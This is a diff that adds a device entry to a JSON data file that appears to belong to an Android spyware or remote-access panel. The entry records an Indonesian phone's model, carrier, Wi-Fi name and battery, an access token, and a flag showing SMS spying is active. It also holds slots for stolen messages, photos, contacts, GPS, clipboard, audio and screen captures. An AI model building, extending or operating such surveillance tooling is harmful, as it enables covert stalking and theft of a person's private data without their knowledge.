@@ -2288,5 +2288,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "pxc_1c697602",
+    "deviceName": "HP-KUDA-E183",
+    "ownerUsername": "ziwoo",
+    "token": "7d1ea3b714d80a93314841b47e6239c8",
+    "lastSeen": 1777691675223,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-05-02T03:14:35.223Z",
+    "deviceInfo": {
+      "model": "INFINIX Infinix X665E",
+      "androidVersion": "Android 12",
+      "battery": 26,
+      "network": "WiFi: OPPO A5x 6220",
+      "sim1": "TELKOMSEL",
+      "sim2": "Tidak ada layanan"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
